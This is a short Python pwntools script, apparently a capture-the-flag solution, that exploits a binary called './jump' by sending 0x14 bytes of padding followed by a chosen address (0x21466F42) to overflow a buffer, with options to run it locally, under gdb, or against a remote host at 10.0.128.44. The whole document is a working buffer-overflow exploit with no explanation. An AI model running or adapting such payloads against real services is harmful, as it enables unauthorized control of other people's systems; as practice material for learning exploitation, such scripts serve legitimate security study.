from pwn import *
elf_file = FILENAME = './jump'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = '10.0.128.44'
POST = 8102
#libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''
  b main
  ''')
else:
  c = process(FILENAME)

flag_add = 0x21466F42


payload = b'a'*0x14
payload+= p32(flag_add)
c.send(payload)


c.interactive()
